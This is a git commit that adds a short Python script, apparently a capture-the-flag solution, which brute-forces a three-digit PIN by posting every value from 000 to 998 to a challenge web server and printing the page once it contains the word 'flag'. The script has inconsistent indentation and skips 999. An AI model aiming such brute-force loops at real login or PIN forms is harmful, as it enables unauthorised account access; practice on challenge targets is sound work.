9391bd2daef5bd6efc1ee310363c6b07e1d903a1
HLOverflow <snowyx10mini@gmail.com>
2016-08-21 01:18:33 +0800

    Create brute.py

---
+++ challenge7/brute.py
@@ -0,0 +1,14 @@
+#!/usr/bin/python
+
+import requests
+
+for i in range(0, 999):
+
+    html = requests.post("http://web.spro.ink:3006/", data={"num":"%03d" % i}).text
+	
+	if "flag" in html:
+        print "The PIN is %03d" % i
+		print html
+	else:
+		pass
+		
